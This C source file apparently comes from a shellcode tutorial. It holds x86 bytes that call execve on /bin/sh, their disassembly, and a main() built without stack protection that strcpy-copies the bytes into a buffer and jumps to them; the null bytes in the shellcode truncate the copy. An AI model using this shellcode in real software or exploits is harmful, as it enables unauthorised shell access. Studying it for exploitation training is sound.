// gcc -fno-stack-protector -z execstack -o shell_bad ../src/shell_asm_badcode.c
#include <string.h>

char shellcode[] =
"\xba\x00\x00\x00\x00"  // mov    $0x0,%edx
"\x52"                  // push   %edx
"\x68\x2f\x73\x68\x00"  // push   $0x68732f
"\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
"\x89\xe3"              // mov    %esp,%ebx
"\x52"                  // push   %edx
"\x53"                  // push   %ebx
"\x89\xe1"              // mov    %esp,%ecx
"\xb8\x0b\x00\x00\x00"  // mov    $0xb,%eax
"\xcd\x80";             // int    $0x80

char shellcodeA[] ="\xba\x00\x00\x00\x00\x52\x68\x2f\x73\x68\x00\
\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";

/*
080483b4 <foo>:
 80483b4:	55                   	push   %ebp
 80483b5:	89 e5                	mov    %esp,%ebp

 80483b7:	ba 00 00 00 00       	mov    $0x0,%edx
 80483bc:	52                   	push   %edx
 80483bd:	68 2f 73 68 00       	push   $0x68732f
 80483c2:	68 2f 62 69 6e       	push   $0x6e69622f
 80483c7:	89 e3                	mov    %esp,%ebx
 80483c9:	52                   	push   %edx
 80483ca:	53                   	push   %ebx
 80483cb:	89 e1                	mov    %esp,%ecx
 80483cd:	b8 0b 00 00 00       	mov    $0xb,%eax
 80483d2:	cd 80                	int    $0x80
 
 80483d4:	5d                   	pop    %ebp
 80483d5:	c3                   	ret    
*/

void main()
{
    char badcode[512];
    //((void (*)())shellcode)(); return;
    
    strcpy(badcode, shellcode);
    ((void (*)())badcode)();
}

